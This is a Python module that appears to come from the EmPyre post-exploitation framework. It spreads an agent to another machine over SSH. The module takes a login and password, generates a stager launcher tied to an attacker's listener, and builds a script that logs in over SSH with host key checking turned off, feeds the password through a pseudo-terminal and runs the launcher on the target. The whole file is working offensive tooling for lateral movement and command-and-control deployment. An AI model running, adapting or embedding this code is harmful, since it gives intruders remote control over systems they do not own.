from lib.common import helpers


class Module:
    def __init__(self, mainMenu, params=[]):
        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'SSHCommand',

            # list of one or more authors for the module
            'Author': ['Paul Mikesell', '@424f424f'],

            # more verbose multi-line description of the module
            'Description': 'This module will send an launcher via ssh.',

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : True,

            # list of any references/other comments
            'Comments': [
                'http://blog.clustrix.com/2012/01/31/scripting-ssh-with-python/'
                            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to use ssh from.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Login' : {
                'Description'   :   'user@127.0.0.1',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self):
        login = self.options['Login']['Value']
        password = self.options['Password']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        isEmpire = self.mainMenu.listeners.is_listener_empyre(listenerName)
        if not isEmpire:
            print helpers.color("[!] EmPyre listener required!")
            return ""

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
        launcher = launcher.replace("'", "\\'")
        launcher = launcher.replace('"', '\\"')
        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        script = """

import os
import pty

def wall(host, pw):
    import os,pty
    pid, fd = pty.fork()
    if pid == 0: # Child
        os.execvp('ssh', ['ssh', '-o StrictHostKeyChecking=no', host, '%s'])
        os._exit(1) # fail to execv

    # read '..... password:', write password
    os.read(fd, 1024)
    os.write(fd, '\\n' + pw + '\\n')

    result = []
    while True:
        try:
            data = os.read(fd, 1024)
            if data == "Password:":
                os.write(fd, pw + '\\n')

        except OSError:
            break
        if not data:
            break
        result.append(data)
    pid, status = os.waitpid(pid, 0)
    return status, ''.join(result)

status, output = wall('%s','%s')
print status
print output

""" % (launcher, login, password)
        return script
